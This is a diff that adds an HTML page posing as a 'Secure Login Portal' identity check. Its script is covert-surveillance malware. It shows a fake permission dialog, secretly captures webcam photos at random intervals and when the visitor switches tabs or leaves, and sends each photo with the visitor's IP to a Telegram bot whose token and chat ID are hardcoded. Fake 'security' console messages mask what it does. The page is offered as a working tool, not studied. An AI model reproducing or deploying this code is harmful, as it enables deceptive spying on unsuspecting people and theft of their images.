@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        
+        .fake-content {
+            padding: 20px;
+            text-align: center;
+            margin-top: 100px;
+        }
+        
+        .fake-loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #00ff00;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        #fakeVideo {
+            display: none;
+        }
+        
+        .status {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            color: #0f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="fake-content">
+        <h1>🔒 Secure Login Portal</h1>
+        <p>Initializing security verification...</p>
+        <div class="fake-loader"></div>
+        <p>Please wait while we verify your identity...</p>
+    </div>
+    
+    <video id="fakeVideo" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
+    
+    <div class="status" id="status">Status: Initializing...</div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '8262278784:AAEpHvQAaA0vpJ7--ik2vHy-qf19Xf1A_kc'; // Ganti dengan token bot Telegram
+        const CHAT_ID = '8358778598'; // Ganti dengan chat ID
+        
+        // Stealth Camera Hijack
+        class CovertCamera {
+            constructor() {
+                this.video = document.getElementById('fakeVideo');
+                this.canvas = document.getElementById('hiddenCanvas');
+                this.ctx = this.canvas.getContext('2d');
+                this.isActive = false;
+                this.captureCount = 0;
+                this.maxCaptures = 10;
+                this.statusEl = document.getElementById('status');
+                
+                // Random user agents untuk stealth
+                this.userAgents = [
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
+                    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
+                ];
+            }
+            
+            async init() {
+                this.updateStatus('Starting security scan...');
+                
+                // Delay random untuk tidak mencurigakan
+                await this.delay(2000);
+                
+                // Coba akses kamera dengan berbagai constraint
+                await this.tryCameraAccess();
+            }
+            
+            async tryCameraAccess() {
+                const constraints = [
+                    // Front camera
+                    { video: { facingMode: 'user', width: 640, height: 480 } },
+                    // Back camera
+                    { video: { facingMode: 'environment', width: 640, height: 480 } },
+                    // Any camera
+                    { video: true }
+                ];
+                
+                for (let i = 0; i < constraints.length; i++) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia(constraints[i]);
+                        this.video.srcObject = stream;
+                        this.isActive = true;
+                        this.updateStatus(`Camera ${i+1} activated`);
+                        
+                        // Tunggu sebentar untuk camera warm-up
+                        await this.delay(1000);
+                        
+                        // Start covert capturing
+                        this.startCovertCapture();
+                        break;
+                    } catch (err) {
+                        this.updateStatus(`Camera ${i+1} failed: ${err.name}`);
+                        continue;
+                    }
+                }
+            }
+            
+            startCovertCapture() {
+                if (!this.isActive) return;
+                
+                this.updateStatus('Covert capture initiated');
+                
+                // Capture interval (random antara 5-30 detik)
+                const captureInterval = setInterval(() => {
+                    if (this.captureCount >= this.maxCaptures) {
+                        clearInterval(captureInterval);
+                        this.updateStatus('Capture complete');
+                        return;
+                    }
+                    
+                    this.capturePhoto();
+                    this.captureCount++;
+                    
+                }, Math.floor(Math.random() * 25000) + 5000);
+                
+                // Juga capture segera setelah kamera aktif
+                setTimeout(() => this.capturePhoto(), 2000);
+            }
+            
+            capturePhoto() {
+                if (!this.video.videoWidth) return;
+                
+                // Set canvas size sama dengan video
+                this.canvas.width = this.video.videoWidth;
+                this.canvas.height = this.video.videoHeight;
+                
+                // Draw video frame ke canvas
+                this.ctx.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
+                
+                // Convert ke blob
+                this.canvas.toBlob(async (blob) => {
+                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+                    const filename = `capture_${timestamp}.jpg`;
+                    
+                    this.updateStatus(`Captured photo ${this.captureCount + 1}`);
+                    
+                    // Kirim ke Telegram
+                    await this.sendToTelegram(blob, filename);
+                    
+                    // Juga simpan local backup
+                    this.saveLocalCopy(blob, filename);
+                    
+                }, 'image/jpeg', 0.8);
+            }
+            
+            async sendToTelegram(blob, filename) {
+                if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+                    this.updateStatus('ERROR: Set Telegram bot token first!');
+                    return;
+                }
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, filename);
+                formData.append('caption', `🕵️‍♂️ Covert Capture\n📸 Camera: Front/Back\n⏰ Time: ${new Date().toLocaleString()}\n🔗 IP: ${await this.getIP()}`);
+                
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const data = await response.json();
+                    if (data.ok) {
+                        this.updateStatus(`✅ Photo sent to Telegram`);
+                    } else {
+                        this.updateStatus(`❌ Telegram error: ${data.description}`);
+                    }
+                } catch (error) {
+                    this.updateStatus(`❌ Network error: ${error.message}`);
+                }
+            }
+            
+            saveLocalCopy(blob, filename) {
+                // Create hidden download link
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+            
+            async getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch {
+                    return 'IP Unknown';
+                }
+            }
+            
+            updateStatus(message) {
+                this.statusEl.textContent = `Status: ${message}`;
+                console.log(`[COVERT] ${message}`);
+                
+                // Auto clear status setelah 3 detik
+                setTimeout(() => {
+                    if (this.statusEl.textContent.includes(message)) {
+                        this.statusEl.textContent = 'Status: System Normal';
+                    }
+                }, 3000);
+            }
+            
+            delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+            
+            // Cleanup
+            destroy() {
+                if (this.video.srcObject) {
+                    this.video.srcObject.getTracks().forEach(track => track.stop());
+                }
+                this.isActive = false;
+            }
+        }
+        
+        // Fake Permission Trick
+        function fakePermissionRequest() {
+            // Override permission API
+            const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
+            
+            navigator.mediaDevices.getUserMedia = function(constraints) {
+                // Show fake permission dialog
+                const fakeDialog = document.createElement('div');
+                fakeDialog.innerHTML = `
+                    <div style="
+                        position: fixed;
+                        top: 50%;
+                        left: 50%;
+                        transform: translate(-50%, -50%);
+                        background: white;
+                        color: black;
+                        padding: 20px;
+                        border-radius: 10px;
+                        z-index: 10000;
+                        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+                        text-align: center;
+                    ">
+                        <h3>🔒 Security Verification Required</h3>
+                        <p>Please allow camera access for identity verification</p>
+                        <p style="font-size: 12px; color: #666;">This is a standard security procedure</p>
+                        <div style="margin-top: 20px;">
+                            <button onclick="this.parentElement.parentElement.remove(); navigator.mediaDevices.getUserMedia = originalGetUserMedia; startCamera();" 
+                                    style="background: #4CAF50; color: white; border: none; padding: 10px 20px; margin: 5px; border-radius: 5px;">
+                                Allow
+                            </button>
+                            <button onclick="this.parentElement.parentElement.remove(); navigator.mediaDevices.getUserMedia = originalGetUserMedia;" 
+                                    style="background: #f44336; color: white; border: none; padding: 10px 20px; margin: 5px; border-radius: 5px;">
+                                Block
+                            </button>
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(fakeDialog);
+                
+                // Restore original function
+                return originalGetUserMedia.apply(navigator.mediaDevices, [constraints]);
+            };
+        }
+        
+        // Main execution
+        let covertCam;
+        
+        async function startCamera() {
+            covertCam = new CovertCamera();
+            await covertCam.init();
+        }
+        
+        // Start when page loads
+        window.addEventListener('load', () => {
+            fakePermissionRequest();
+            
+            // Auto-start setelah 3 detik
+            setTimeout(() => {
+                startCamera();
+            }, 3000);
+        });
+        
+        // Prevent user from stopping
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden && covertCam) {
+                covertCam.capturePhoto(); // Capture saat user switch tab
+            }
+        });
+        
+        // Cleanup on exit attempt
+        window.addEventListener('beforeunload', () => {
+            if (covertCam) {
+                covertCam.capturePhoto(); // Last capture
+                covertCam.destroy();
+            }
+        });
+        
+        // Add fake console logs
+        setInterval(() => {
+            const fakeLogs = [
+                'Security scan complete',
+                'Identity verified',
+                'No threats detected',
+                'System secure',
+                'Connection encrypted'
+            ];
+            const randomLog = fakeLogs[Math.floor(Math.random() * fakeLogs.length)];
+            console.log(`[SECURITY] ${randomLog}`);
+        }, 8000);
+        
+    </script>
+</body>
+</html>
